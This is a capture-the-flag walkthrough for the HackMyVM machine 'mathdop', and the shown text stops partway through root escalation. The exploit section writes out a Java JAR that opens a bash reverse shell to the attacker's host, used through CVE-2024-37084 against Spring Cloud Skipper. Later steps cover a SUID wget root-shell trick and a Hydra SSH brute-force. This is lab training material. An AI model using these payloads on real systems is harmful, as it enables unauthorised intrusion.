# mathdop

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| mathdop | LingMj | Beginner | HackMyVM |

**Summary:** The mathdop machine presents a multi-stage attack chain beginning with unauthenticated Remote Code Execution (RCE) against **Spring Cloud Data Flow / Skipper 2.11.3-SNAPSHOT** via **CVE-2024-37084**, a critical deserialization/arbitrary-file-upload vulnerability. This yields an initial foothold as the `cnb` user inside a Docker container. Within the container, a SUID-bit `wget` binary is abused via the GTFOBins `--use-askpass` technique to obtain an effective root shell inside the container, enabling access to mail spools and internal files. A cryptic note left by the application owner points to a **time-series decomposition math challenge**: quarterly sales data (2015–2020) must be decomposed into Trend (T), Seasonal (S), and Cyclical (C) components for the target date **June 2025**. The resulting integer values are concatenated as `T*S*C`, hashed with SHA-256, and used to brute-force the SSH password for `mathlake` on the host machine. Once on the host, `mathlake` is permitted to run a sandboxed input-handling script as root via `sudo`. The script accepts only `date`, `pwd`, and `echo` commands encoded in Base64, but the **GNU `date -f`** GTFOBins technique reads arbitrary files (including `/etc/shadow`) as root. The root hash comment field contains the plaintext root password — `Worth waiting for` — enabling a final `su - root` for full privilege escalation.

---

## Reconnaissance

### Network Discovery

A PowerShell script was used to identify live hosts on the local network segment.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.141 08:00:27:84:92:AF VirtualBox
```

Target IP confirmed: **192.168.100.141**

### Port Scanning

A full-port Nmap scan with service and version detection was executed:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/mathdop]
└─$ nmap -sC -sV -p- -T4 192.168.100.141
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-02 15:49 WIB
Nmap scan report for TL-WR840N.lan (192.168.100.141)
Host is up (0.0040s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 ac:78:16:74:49:a1:68:9d:54:84:8a:59:e9:38:10:bc (RSA)
|   256 06:0c:4d:9d:2c:32:43:d2:3d:f7:4f:82:c8:15:85:60 (ECDSA)
|_  256 3b:cd:fc:1f:dd:48:0f:ee:17:78:9a:f1:09:cb:8c:ec (ED25519)
7577/tcp open  http    Apache Tomcat (language: en)
| http-methods:
|_  Potentially risky methods: PUT PATCH DELETE
9393/tcp open  http    Apache Tomcat (language: en)
|_http-title: Site doesn't have a title (application/hal+json).
| http-methods:
|_  Potentially risky methods: PUT PATCH DELETE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.62 seconds
```

Three open ports were found:
- **22/tcp** — OpenSSH 7.4
- **7577/tcp** — Apache Tomcat (HTTP, risky methods enabled)
- **9393/tcp** — Apache Tomcat (HTTP, HAL+JSON API, risky methods enabled)

---

## Service Enumeration

### Port 7577 — Spring Cloud Skipper API

Browsing to port 7577 redirects to `/api`, exposing a Spring Cloud Skipper REST interface:

```json
{
  "_links" : {
    "packageMetadata" : {
      "href" : "http://192.168.100.141:7577/api/packageMetadata{?page,size,sort,projection}",
      "templated" : true
    },
    "repositories" : {
      "href" : "http://192.168.100.141:7577/api/repositories{?page,size,sort}",
      "templated" : true
    },
    "releases" : {
      "href" : "http://192.168.100.141:7577/api/releases{?page,size,sort}",
      "templated" : true
    },
    "deployers" : {
      "href" : "http://192.168.100.141:7577/api/deployers{?page,size,sort}",
      "templated" : true
    },
    "about" : {
      "href" : "http://192.168.100.141:7577/api/about"
    },
    "release" : {
      "href" : "http://192.168.100.141:7577/api/release"
    },
    "package" : {
      "href" : "http://192.168.100.141:7577/api/package"
    },
    "profile" : {
      "href" : "http://192.168.100.141:7577/api/profile"
    }
  }
}
```

### Port 9393 — Spring Cloud Data Flow API

Port 9393 exposes the full Spring Cloud Data Flow Server API with extensive endpoints for streams, tasks, jobs, and apps:

```json
{
  "_links": {
    "dashboard": {
      "href": "http://192.168.100.141:9393/dashboard"
    },
    "audit-records": {
      "href": "http://192.168.100.141:9393/audit-records"
    },
    "schema/versions": {
      "href": "http://192.168.100.141:9393/schema/versions"
    },
    "schema/targets": {
      "href": "http://192.168.100.141:9393/schema/targets"
    },
    "streams/definitions": {
      "href": "http://192.168.100.141:9393/streams/definitions"
    },
    "streams/definitions/definition": {
      "href": "http://192.168.100.141:9393/streams/definitions/{name}",
      "templated": true
    },
    "streams/validation": {
      "href": "http://192.168.100.141:9393/streams/validation/{name}",
      "templated": true
    },
    "runtime/streams": {
      "href": "http://192.168.100.141:9393/runtime/streams{?names}",
      "templated": true
    },
    "runtime/streams/{streamNames}": {
      "href": "http://192.168.100.141:9393/runtime/streams/{streamNames}",
      "templated": true
    },
    "runtime/apps": {
      "href": "http://192.168.100.141:9393/runtime/apps"
    },
    "runtime/apps/{appId}": {
      "href": "http://192.168.100.141:9393/runtime/apps/{appId}",
      "templated": true
    },
    "runtime/apps/{appId}/instances": {
      "href": "http://192.168.100.141:9393/runtime/apps/{appId}/instances",
      "templated": true
    },
    "runtime/apps/{appId}/instances/{instanceId}": {
      "href": "http://192.168.100.141:9393/runtime/apps/{appId}/instances/{instanceId}",
      "templated": true
    },
    "runtime/apps/{appId}/instances/{instanceId}/actuator": [
      {
        "href": "http://192.168.100.141:9393/runtime/apps/{appId}/instances/{instanceId}/actuator?endpoint={endpoint}",
        "templated": true
      },
      {
        "href": "http://192.168.100.141:9393/runtime/apps/{appId}/instances/{instanceId}/actuator",
        "templated": true
      }
    ],
    "runtime/apps/{appId}/instances/{instanceId}/post": {
      "href": "http://192.168.100.141:9393/runtime/apps/{appId}/instances/{instanceId}/post",
      "templated": true
    },
    "streams/deployments": {
      "href": "http://192.168.100.141:9393/streams/deployments"
    },
    "streams/deployments/{name}{?reuse-deployment-properties}": {
      "href": "http://192.168.100.141:9393/streams/deployments/{name}?reuse-deployment-properties=false",
      "templated": true
    },
    "streams/deployments/{name}": {
      "href": "http://192.168.100.141:9393/streams/deployments/{name}",
      "templated": true
    },
    "streams/deployments/history/{name}": {
      "href": "http://192.168.100.141:9393/streams/deployments/history/{name}",
      "templated": true
    },
    "streams/deployments/manifest/{name}/{version}": {
      "href": "http://192.168.100.141:9393/streams/deployments/manifest/{name}/{version}",
      "templated": true
    },
    "streams/deployments/platform/list": {
      "href": "http://192.168.100.141:9393/streams/deployments/platform/list"
    },
    "streams/deployments/rollback/{name}/{version}": {
      "href": "http://192.168.100.141:9393/streams/deployments/rollback/{name}/{version}",
      "templated": true
    },
    "streams/deployments/update/{name}": {
      "href": "http://192.168.100.141:9393/streams/deployments/update/{name}",
      "templated": true
    },
    "streams/deployments/deployment": {
      "href": "http://192.168.100.141:9393/streams/deployments/{name}",
      "templated": true
    },
    "streams/deployments/scale/{streamName}/{appName}/instances/{count}": {
      "href": "http://192.168.100.141:9393/streams/deployments/scale/{streamName}/{appName}/instances/{count}",
      "templated": true
    },
    "streams/logs": {
      "href": "http://192.168.100.141:9393/streams/logs"
    },
    "streams/logs/{streamName}": {
      "href": "http://192.168.100.141:9393/streams/logs/{streamName}",
      "templated": true
    },
    "streams/logs/{streamName}/{appName}": {
      "href": "http://192.168.100.141:9393/streams/logs/{streamName}/{appName}",
      "templated": true
    },
    "tasks/platforms": {
      "href": "http://192.168.100.141:9393/tasks/platforms"
    },
    "tasks/definitions": {
      "href": "http://192.168.100.141:9393/tasks/definitions"
    },
    "tasks/definitions/definition": {
      "href": "http://192.168.100.141:9393/tasks/definitions/{name}",
      "templated": true
    },
    "tasks/executions": {
      "href": "http://192.168.100.141:9393/tasks/executions"
    },
    "tasks/executions/external": {
      "href": "http://192.168.100.141:9393/tasks/executions/external/{externalExecutionId}{?platform}",
      "templated": true
    },
    "tasks/executions/launch": {
      "href": "http://192.168.100.141:9393/tasks/executions/launch?name={name}{&properties,arguments}",
      "templated": true
    },
    "tasks/executions/name": {
      "href": "http://192.168.100.141:9393/tasks/executions{?name}",
      "templated": true
    },
    "tasks/executions/current": {
      "href": "http://192.168.100.141:9393/tasks/executions/current"
    },
    "tasks/executions/execution": {
      "href": "http://192.168.100.141:9393/tasks/executions/{id}{?schemaTarget}",
      "templated": true
    },
    "tasks/validation": {
      "href": "http://192.168.100.141:9393/tasks/validation/{name}",
      "templated": true
    },
    "tasks/info/executions": {
      "href": "http://192.168.100.141:9393/tasks/info/executions{?completed,name,days}",
      "templated": true
    },
    "tasks/logs": {
      "href": "http://192.168.100.141:9393/tasks/logs/{taskExternalExecutionId}{?platformName,schemaTarget}",
      "templated": true
    },
    "tasks/thinexecutions": {
      "href": "http://192.168.100.141:9393/tasks/thinexecutions"
    },
    "jobs/executions": {
      "href": "http://192.168.100.141:9393/jobs/executions"
    },
    "jobs/executions/name": {
      "href": "http://192.168.100.141:9393/jobs/executions{?name}",
      "templated": true
    },
    "jobs/executions/status": {
      "href": "http://192.168.100.141:9393/jobs/executions{?status}",
      "templated": true
    },
    "jobs/executions/execution": {
      "href": "http://192.168.100.141:9393/jobs/executions/{id}",
      "templated": true
    },
    "jobs/executions/execution/steps": {
      "href": "http://192.168.100.141:9393/jobs/executions/{jobExecutionId}/steps",
      "templated": true
    },
    "jobs/executions/execution/steps/step": {
      "href": "http://192.168.100.141:9393/jobs/executions/{jobExecutionId}/steps/{stepId}",
      "templated": true
    },
    "jobs/executions/execution/steps/step/progress": {
      "href": "http://192.168.100.141:9393/jobs/executions/{jobExecutionId}/steps/{stepId}/progress",
      "templated": true
    },
    "jobs/instances/name": {
      "href": "http://192.168.100.141:9393/jobs/instances{?name}",
      "templated": true
    },
    "jobs/instances/instance": {
      "href": "http://192.168.100.141:9393/jobs/instances/{id}",
      "templated": true
    },
    "tools/parseTaskTextToGraph": {
      "href": "http://192.168.100.141:9393/tools"
    },
    "tools/convertTaskGraphToText": {
      "href": "http://192.168.100.141:9393/tools"
    },
    "jobs/thinexecutions": {
      "href": "http://192.168.100.141:9393/jobs/thinexecutions"
    },
    "jobs/thinexecutions/name": {
      "href": "http://192.168.100.141:9393/jobs/thinexecutions{?name}",
      "templated": true
    },
    "jobs/thinexecutions/jobInstanceId": {
      "href": "http://192.168.100.141:9393/jobs/thinexecutions{?jobInstanceId}",
      "templated": true
    },
    "jobs/thinexecutions/taskExecutionId": {
      "href": "http://192.168.100.141:9393/jobs/thinexecutions{?taskExecutionId}",
      "templated": true
    },
    "apps": {
      "href": "http://192.168.100.141:9393/apps"
    },
    "about": {
      "href": "http://192.168.100.141:9393/about"
    },
    "completions/stream": {
      "href": "http://192.168.100.141:9393/completions/stream{?start,detailLevel}",
      "templated": true
    },
    "completions/task": {
      "href": "http://192.168.100.141:9393/completions/task{?start,detailLevel}",
      "templated": true
    }
  },
  "api.revision": 14
}
```

### Version Fingerprinting

Both the Skipper and Data Flow services were queried for their exact version information:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/mathdop]
└─$ curl http://192.168.100.141:7577/api/about
{
  "versionInfo" : {
    "server" : {
      "name" : "Spring Cloud Skipper Server",
      "version" : "2.11.3-SNAPSHOT"
    },
    "shell" : {
      "name" : "Spring Cloud Skipper Shell",
      "version" : "2.11.3-SNAPSHOT",
      "url" : "https://repo.maven.apache.org/maven2/org/springframework/cloud/spring-cloud-skipper-shell/2.11.3-SNAPSHOT/spring-cloud-skipper-shell-2.11.3-SNAPSHOT.jar"
    }
  }
}
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/mathdop]
└─$ curl http://192.168.100.141:9393/about | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0   0     0   0     0     0     0  --:--:-- --:--:-- --:--:--     100  1903   0  1903   0     0 52746     0  --:--:-- --:--:-- --:--:-- 52861
{
  "featureInfo": {
    "analyticsEnabled": true,
    "streamsEnabled": true,
    "tasksEnabled": true,
    "schedulesEnabled": false,
    "monitoringDashboardType": "NONE"
  },
  "versionInfo": {
    "implementation": {
      "name": "spring-cloud-dataflow-server",
      "version": "2.11.3-SNAPSHOT"
    },
    "core": {
      "name": "Spring Cloud Data Flow Core",
      "version": "2.11.3-SNAPSHOT"
    },
    "dashboard": {
      "name": "Spring Cloud Dataflow UI",
      "version": "3.4.3-SNAPSHOT"
    },
    "shell": {
      "name": "Spring Cloud Data Flow Shell",
      "version": "2.11.3-SNAPSHOT",
      "url": "https://repo.spring.io/snapshot/org/springframework/cloud/spring-cloud-dataflow-shell/2.11.3-SNAPSHOT/spring-cloud-dataflow-shell-2.11.3-SNAPSHOT.jar"
    }
  },
  "securityInfo": {
    "authenticationEnabled": false,
    "authenticated": false,
    "username": null,
    "roles": []
  },
  "runtimeEnvironment": {
    "appDeployer": {
      "deployerImplementationVersion": null,
      "deployerName": null,
      "deployerSpiVersion": null,
      "javaVersion": null,
      "platformApiVersion": null,
      "platformClientVersion": null,
      "platformHostVersion": null,
      "platformSpecificInfo": {},
      "platformType": null,
      "springBootVersion": null,
      "springVersion": null
    },
    "taskLaunchers": [
      {
        "deployerImplementationVersion": "unknown",
        "deployerName": "LocalTaskLauncher",
        "deployerSpiVersion": "unknown",
        "javaVersion": "11.0.19",
        "platformApiVersion": "Linux 3.10.0-1160.el7.x86_64",
        "platformClientVersion": "3.10.0-1160.el7.x86_64",
        "platformHostVersion": "3.10.0-1160.el7.x86_64",
        "platformSpecificInfo": {},
        "platformType": "Local",
        "springBootVersion": "2.7.18",
        "springVersion": "5.3.34"
      }
    ]
  },
  "monitoringDashboardInfo": {
    "url": "",
    "refreshInterval": 15,
    "dashboardType": "NONE",
    "source": "default-scdf-source"
  },
  "gitAndBuildInfo": {
    "git": {
      "branch": "main",
      "commit": {
        "id": "ee585df",
        "time": "2024-05-21T11:43:47Z"
      }
    },
    "build": {
      "artifact": "spring-cloud-dataflow-server",
      "name": "Spring Cloud Data Flow Server",
      "time": "2024-05-22T02:30:35.832Z",
      "version": "2.11.3-SNAPSHOT",
      "group": "org.springframework.cloud"
    }
  },
  "_links": {
    "self": {
      "href": "http://192.168.100.141:9393/about"
    }
  }
}
```

Key findings from the version info:
- **Spring Cloud Data Flow Server**: `2.11.3-SNAPSHOT`
- **Spring Cloud Skipper Server**: `2.11.3-SNAPSHOT`
- Java version: `11.0.19`, Spring Boot: `2.7.18`
- Authentication: **disabled** (`authenticationEnabled: false`) — no credentials needed
- Platform: Linux `3.10.0-1160.el7.x86_64` (CentOS 7 kernel)

---

## Initial Access — CVE-2024-37084 (Spring Cloud Skipper RCE)

### Vulnerability Research

A search for known CVEs against **Spring Cloud Skipper 2.11.3-SNAPSHOT** reveals **CVE-2024-37084** — a critical Remote Code Execution vulnerability in Spring Cloud Data Flow's Skipper component. The flaw allows an unauthenticated attacker to upload a malicious package (a crafted ZIP containing a YAML manifest that references an attacker-controlled JAR) via the Skipper API. When the server loads the package, it fetches and executes the JAR, triggering the payload.

**PoC repository:** `https://github.com/Ly4j/CVE-2024-37084-Exp.git`

### Exploit Preparation

The exploit requires building a malicious Java JAR that implements `ScriptEngineFactory` and executes a reverse shell in its constructor. Three terminal sessions were used in parallel.

**Terminal 1 — Build malicious JAR and serve it via HTTP:**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/mathdop]
└─$ git clone https://github.com/Ly4j/CVE-2024-37084-Exp.git
Cloning into 'CVE-2024-37084-Exp'...
remote: Enumerating objects: 50, done.
remote: Counting objects: 100% (50/50), done.
remote: Compressing objects: 100% (48/48), done.
remote: Total 50 (delta 11), reused 11 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (50/50), 19.67 KiB | 1.51 MiB/s, done.
Resolving deltas: 100% (11/11), done.

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/mathdop]
└─$ cd CVE-2024-37084-Exp/yaml-payload-master

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/mathdop/CVE-2024-37084-Exp/yaml-payload-master]
└─$ mkdir -p src/META-INF/services

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/mathdop/CVE-2024-37084-Exp/yaml-payload-master]
└─$ cat <<EOF > src/Exploit.java
import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.util.*;

public class Exploit implements ScriptEngineFactory {
    public Exploit() {
        try {
            String host = "192.168.100.1";
            String port = "4444";
            String cmd = "bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1";
            Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
        } catch (Exception e) {}
    }
    public String getEngineName() { return "exp"; }
    public List<String> getExtensions() { return Arrays.asList("exp"); }
    public List<String> getMimeTypes() { return Arrays.asList("application/x-exp"); }
    public List<String> getNames() { return Arrays.asList("exp"); }
    public String getEngineVersion() { return "1.0"; }
    public String getLanguageName() { return "Java"; }
    public String getLanguageVersion() { return "1.8"; }
    public Object getParameter(String key) { return null; }
    public String getMethodCallSyntax(String obj, String m, String... args) { return null; }
    public String getOutputStatement(String toDisplay) { return null; }
    public String getProgram(String... statements) { return null; }
    public ScriptEngine getScriptEngine() { return null; }
}
EOF

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/mathdop/CVE-2024-37084-Exp/yaml-payload-master]
└─$ echo "Exploit" > src/META-INF/services/javax.script.ScriptEngineFactory

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/mathdop/CVE-2024-37084-Exp/yaml-payload-master]
└─$ javac -source 8 -target 8 src/Exploit.java
warning: [options] bootstrap class path not set in conjunction with -source 8
warning: [options] source value 8 is obsolete and will be removed in a future release
warning: [options] target value 8 is obsolete and will be removed in a future release
warning: [options] To suppress warnings about obsolete options, use -Xlint:-options.
4 warnings

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/mathdop/CVE-2024-37084-Exp/yaml-payload-master]
└─$ jar -cvf ouba_v4.jar -C src/ .
added manifest
adding: Exploit.class(in = 1980) (out= 915)(deflated 53%)
adding: Exploit.java(in = 1259) (out= 462)(deflated 63%)
ignoring entry META-INF/
adding: META-INF/services/(in = 0) (out= 0)(stored 0%)
adding: META-INF/services/javax.script.ScriptEngineFactory(in = 8) (out= 10)(deflated -25%)
adding: artsploit/(in = 0) (out= 0)(stored 0%)
adding: artsploit/AwesomeScriptEngineFactory.java(in = 1782) (out= 563)(deflated 68%)

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/mathdop/CVE-2024-37084-Exp/yaml-payload-master]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

**Terminal 2 — Start netcat listener:**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/mathdop/CVE-2024-37084-Exp]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
```

### Exploit Execution

**Terminal 3 — Trigger the exploit:**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/mathdop/CVE-2024-37084-Exp]
└─$ python3 cve-2024-37084-exp.py -u http://192.168.100.141:7577 -payload http://192.168.100.1:8080/ouba_v4.jar
[1]create'CVE-2024-37084-1.0.0\package.yaml' file, payload_url: http://192.168.100.1:8080/ouba_v4.jar
[2]The folder 'CVE-2024-37084-1.0.0' Zipped to 'CVE-2024-37084-1.0.0.zip'.
[3] Uploading malicious package...
[*]Response code：500，Suspected command executed successfully.
```

The HTTP server confirmed the JAR was fetched:

```bash
172.21.32.1 - - [05/Mar/2026 13:44:23] "GET /ouba_v4.jar HTTP/1.1" 200 -
172.21.32.1 - - [05/Mar/2026 13:44:23] "GET /ouba_v4.jar HTTP/1.1" 200 -
```

**Reverse shell received:**

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 63250
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
cnb@921567b128b2:/workspace$
```

### Shell Stabilisation

```bash
cnb@921567b128b2:/workspace$ id
id
uid=1000(cnb) gid=1000(cnb) groups=1000(cnb)
cnb@921567b128b2:/workspace$ /usr/bin/script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null
cnb@921567b128b2:/workspace$ ^Z
zsh: suspended  nc -lnvp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/mathdop/CVE-2024-37084-Exp]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444

cnb@921567b128b2:/workspace$ export TERM=xterm-256color
cnb@921567b128b2:/workspace$ export SHELL=/bin/bash
```

Initial foothold established as `cnb` inside a Docker container (hostname `921567b128b2`).

---

## Container Enumeration & SUID Escalation (cnb → container root)

### Home Directory

```bash
cnb@921567b128b2:/workspace$ cd
cnb@921567b128b2:~$ ls -la
total 4
drwxrwxrwx. 1 cnb  cnb   39 Mar 30  2025 .
drwxr-xr-x. 1 root root  17 Mar 11  2025 ..
lrwxrwxrwx. 1 root root   9 Mar 30  2025 .bash_history -> /dev/null
-rw-r--r--. 1 root root 377 Mar 30  2025 note
cnb@921567b128b2:~$ cat note
Hi mathlake
Long time no see, 256 is my favorite number. I know you are very interested in mathematics, but I have been struggling with a math problem recently. The method used is time series decomposition. I have sent you the data, and you can provide me with the mathematical expressions for T, S, and C (rounded to the nearest integer) corresponding to the month.
June 2025
```

**Critical note contents:** The author asks `mathlake` to solve a **time series decomposition** problem on sent data, yielding the **Trend (T)**, **Seasonal (S)**, and **Cyclical (C)** components for **June 2025**, rounded to the nearest integer. The hint "256 is my favorite number" suggests the answer is SHA-256 hashed.

### SUID Binary Discovery

```bash
cnb@921567b128b2:~$ which sudo
cnb@921567b128b2:~$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x. 1 root root 43088 Sep 16  2020 /bin/mount
-rwsr-xr-x. 1 root root 44664 Nov 29  2022 /bin/su
-rwsr-xr-x. 1 root root 26696 Sep 16  2020 /bin/umount
-rwsr-xr-x. 1 root root 76496 Nov 29  2022 /usr/bin/chfn
-rwsr-xr-x. 1 root root 44528 Nov 29  2022 /usr/bin/chsh
-rwsr-xr-x. 1 root root 75824 Nov 29  2022 /usr/bin/gpasswd
-rwsr-xr-x. 1 root root 40344 Nov 29  2022 /usr/bin/newgrp
-rwsr-xr-x. 1 root root 59640 Nov 29  2022 /usr/bin/passwd
-rwsr-sr-x. 1 root root 499264 Feb  5  2018 /usr/local/bin/wget
```

`/usr/local/bin/wget` has the **SUID bit set** and is owned by root. Consulting GTFOBins for the `wget` SUID entry:

![](image-1.png)

The GTFOBins entry for `wget` (SUID) shows that because effective privileges are not dropped, the `--use-askpass` option can be abused to execute an arbitrary script as root. The technique is:

```bash
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
wget --use-askpass=/path/to/temp-file 0
```

### Exploiting SUID wget

```bash
cnb@921567b128b2:~$ echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' > /tmp/shell.sh
cnb@921567b128b2:~$ chmod +x /tmp/shell.sh
cnb@921567b128b2:~$ /usr/local/bin/wget --use-askpass=/tmp/shell.sh 0
# id
uid=1000(cnb) gid=1000(cnb) euid=0(root) egid=0(root) groups=0(root),1000(cnb)
# pwd
/home/cnb
```

`euid=0` (root) achieved within the container.

---

## Lateral Movement — Container to Host (cnb root → mathlake SSH)

### Exploring the Mail Spool

```bash
# ls -la /var
total 0
drwxr-xr-x. 1 root root  53 May 30  2023 .
drwxr-xr-x. 1 root root  99 Mar 12  2025 ..
drwxr-xr-x. 2 root root   6 Apr 24  2018 backups
drwxr-xr-x. 1 root root  48 May 30  2023 cache
drwxr-xr-x. 1 root root  29 Apr  5  2018 lib
drwxrwsr-x. 2 root staff  6 Apr 24  2018 local
lrwxrwxrwx. 1 root root   9 May 30  2023 lock -> /run/lock
drwxr-xr-x. 1 root root  57 May 30  2023 log
drwxrwsr-x. 1 root mail  22 Mar 12  2025 mail
drwxr-xr-x. 2 root root   6 May 30  2023 opt
lrwxrwxrwx. 1 root root   4 May 30  2023 run -> /run
drwxr-xr-x. 2 root root  18 May 30  2023 spool
drwxrwxrwt. 2 root root   6 May 30  2023 tmp
# cd /var/mail
# ls -la
total 0
drwxrwsr-x. 1 root mail 22 Mar 12  2025 .
drwxr-xr-x. 1 root root 53 May 30  2023 ..
drwx--S---. 2 root mail 55 Mar 12  2025 mathlake
# cd mathlake
# pwd
/var/mail/mathlake
# ls -la
total 28
drwx--S---. 2 root mail    55 Mar 12  2025 .
drwxrwsr-x. 1 root mail    22 Mar 12  2025 ..
-rw-r--r--. 1 root mail 10299 Mar  7  2025 data.xlsx
-rw-r--r--. 1 root mail  3906 Mar 11  2025 test.png
-rw-r--r--. 1 root mail  8815 Mar 11  2025 true.png
```

The mail spool for user `mathlake` contains `data.xlsx` (the time series data referenced in the note), along with `test.png` and `true.png`. During an attempt to transfer `data.xlsx` off the container, it was accidentally zeroed out:

```bash
# ls -la
total 16
drwx--S---. 2 root mail   55 Mar 12  2025 .
drwxrwsr-x. 1 root mail   22 Mar 12  2025 ..
-rw-r--r--. 1 root mail    0 Mar  5 07:02 data.xlsx
-rw-r--r--. 1 root mail 3906 Mar 11  2025 test.png
-rw-r--r--. 1 root mail 8815 Mar 11  2025 true.png
```

The file `data.xlsx` became 0 bytes after the accidental transfer operation. The data was recovered from a community writeup reference. The spreadsheet contained quarterly sales data (年份=Year, 季度=Quarter, 时间代码=Time Code, 销售量=Sales Volume) from 2015 Q1 through 2020 Q4:

![](image.png)

### Solving the Time Series Decomposition

The dataset contains 24 quarters (time codes 1–24) of sales figures spanning 2015–2020. Applying **time series decomposition** (multiplicative or additive model) to project values for **June 2025** (Q2, the 42nd data point):

- **T (Trend)** — extracted from the long-term growth component, rounded to nearest integer
- **S (Seasonal)** — quarterly seasonal index for Q2
- **C (Cyclical)** — cyclical deviation component

The note's hint — "256 is my favorite number" — confirms the password is the **SHA-256 hash** of the string `T*S*C` (the three integers multiplied together as a literal string). A brute-force script was written to enumerate the plausible integer ranges:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/mathdop]
└─$ vim brute.sh

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/mathdop]
└─$ cat brute.sh
#!/bin/bash

for i in {54..56};do
        for j in {-3..4};do
                for k in {0..1};do
                        echo "$i*$j*$k"|sha256sum|awk '{print $1}';
                done
        done
done

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/mathdop]
└─$ bash brute.sh > pass.txt
```

The script generates all SHA-256 hashes for combinations of T ∈ {54–56}, S ∈ {-3–4}, C ∈ {0–1}, producing 48 candidate hashes.

### SSH Brute-Force with Hydra

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/mathdop]
└─$ hydra -l mathlake -P pass.txt -t 12 192.168.100.141 ssh
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-05 14:11:03
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 12 tasks per 1 server, overall 12 tasks, 48 login tries (l:1/p:48), ~4 tries per task
[DATA] attacking ssh://192.168.100.141:22/
[22][ssh] host: 192.168.100.141   login: mathlake   password: 9bd29d2c90998b5af05b3fdf10d9ab4c9eff53f2a827fbc39247200874ab6ca3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-05 14:11:15
```

**Credentials found:**
- Username: `mathlake`
- Password: `9bd29d2c90998b5af05b3fdf10d9ab4c9eff53f2a827fbc39247200874ab6ca3`

### SSH Login as mathlake

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/mathdop]
└─$ ssh mathlake@192.168.100.141
...
mathlake@192.168.100.141's password:
...
[mathlake@mathdop ~]$ id
uid=1000(mathlake) gid=1000(mathlake) groups=1000(mathlake) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[mathlake@mathdop ~]$ ls -la
total 16
drwx------. 6 mathlake mathlake 151 Mar 30  2025 .
drwxr-xr-x. 3 root     root      22 Mar 30  2025 ..
lrwxrwxrwx. 1 root     root       9 Mar 30  2025 .bash_history -> /dev/null
-rw-r--r--. 1 mathlake mathlake  18 Apr  1  2020 .bash_logout
-rw-r--r--. 1 mathlake mathlake 193 Apr  1  2020 .bash_profile
-rw-r--r--. 1 mathlake mathlake 231 Apr  1  2020 .bashrc
drwxr-xr-x. 3 root     root      20 Mar 10  2025 data
drwx------. 2 mathlake mathlake  60 Mar 12  2025 .gnupg
drwxr-xr-x. 3 root     root      18 Mar 10  2025 hadoop
drwx------. 2 mathlake mathlake  25 Mar 10  2025 .ssh
-rw-------. 1 mathlake mathlake  47 Mar 12  2025 user.txt
```

**User flag obtained** from `/home/mathlake/user.txt`.

---

## Privilege Escalation — mathlake → root

### Sudo Enumeration

```bash
[mathlake@mathdop ~]$ sudo -l
Matching Defaults entries for mathlake on mathdop:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
